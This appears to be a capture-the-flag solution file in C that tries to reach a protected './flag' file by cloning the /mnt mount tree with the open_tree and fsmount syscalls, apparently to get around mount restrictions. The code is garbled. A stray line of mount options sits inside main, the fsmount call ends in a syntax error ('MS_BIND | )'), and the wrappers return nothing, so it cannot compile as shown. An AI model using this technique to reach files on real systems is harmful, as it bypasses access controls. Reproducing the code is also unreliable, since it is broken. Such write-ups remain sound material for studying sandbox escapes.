#if 0
gcc ./sol.c -o ./sol
#endif

#include <sys/types.h>
#include <sys/mount.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/syscall.h>      /* Definition of SYS_* constants */
#include <stdlib.h>
#include <stdio.h>

#define OPEN_TREE_CLONE    1         /* Clone the target tree and attach the clone */
#define MOVE_MOUNT_F_EMPTY_PATH 0x00000004 /* Empty from path permitted */

int open_tree(int fd, char *path, unsigned int flags)
{
    syscall(SYS_open_tree, fd, path, flags);
}

int fsmount(int fd, int flags, int mode)
{
    syscall(SYS_fsmount, fd, flags, mode);
}

int move_mount(int from_fd, char *from_path, int to_fd, char *to_path, unsigned int flags)
{
    syscall(SYS_move_mount, from_fd, from_path, to_fd, to_path, flags);
}

int main()
{
    int fd1;
    int fd2;
    int rc;

    fd1 = open_tree(AT_FDCWD, "/mnt/", 0);
    if (-1 == fd1)
    {
        perror("fd1");
        exit(-1);
    }
    fd2 = open_tree(fd1, "", AT_EMPTY_PATH | OPEN_TREE_CLONE | AT_RECURSIVE);
    if (-1 == fd2)
    {
        perror("fd2");
        exit(-1);
    }
    // rc = move_mount(fd2, "", AT_FDCWD, "~/flag", MOVE_MOUNT_F_EMPTY_PATH);
    // if (-1 == rc)
    // {
    //     perror("move");
    //     exit(-1);
    // }
rw,nosuid,nodev,noexec,relatime,sync,dirsync
    rc = fsmount(fd2, 0, MS_BIND | );
    if (-1 == rc)
    {
        perror("fsmount");
        exit(-1);
    }

    rc = openat(fd2, "./flag", O_RDONLY);
    if (-1 == rc)
    {
        perror("openat");
        exit(-1);
    }

    return 0;
}